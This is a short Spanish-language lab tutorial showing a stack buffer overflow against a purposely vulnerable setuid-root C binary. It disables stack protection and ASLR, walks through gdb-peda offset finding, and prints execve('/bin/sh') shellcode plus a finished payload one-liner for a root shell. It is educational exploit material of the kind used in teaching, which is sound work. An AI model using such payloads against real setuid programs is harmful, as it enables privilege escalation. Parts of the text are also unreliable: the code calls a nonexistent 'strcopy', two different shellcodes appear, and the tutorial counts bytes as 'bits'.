## Script
```bash
#include <stdio.h>

void vuln(char *buff){
	char buffer[64];
	strcopy(buffer, buff);
}

void main(int argc, char **argv){
	vuln(argv[1]);
}
```
## Compilacion
 ```bash
 gcc -z execstack -g -fno-stack-protector -mpreferred-stack-boundary=2 buff.c -o buff
 ```
 ## Permisos
 ```bash
 chown root:root buff
 chmod +s buff
 echo 0 > /proc/sys/kernel/randomize_va_space
 ```
 ## GDB-Peda
 Vemos los registros de la memoria
 
 **Comando:** 
 ```bash
 i r
 ```
 Crea cadenas aleatorias
 
 **Comando:**
 ```bash
 pattern arg 100
 ```
 Ejecuta el binario
 
 **Comando:**
 ```bash
 r
 ```
 En base a la cadena creada anteriormente, busca el tamaño exacto de bites antes de sobreescribir el EIP.
 A ese numero es el que multiplicamos nuestras **"A"** y le sumamos 4 **"B"** que serían 4 bits.
 
 **Comando:**
 ```bash
 pattern search
 ```
 Ver los ultimos registros de la pila
 
 **Comando:**
 ```bash
 x/100wx $esp
 ```
 Nobs (no operate code), que nos sirven a la hora de ejecutar nuestra shell
 ```bash
 \x90
 ```
 Shell
 ```bash
 "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 ```
 Payload final
 ```bash
 $(python -c 'print "A"*68 + "\xd4\xf4\xff\xbf" + "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```
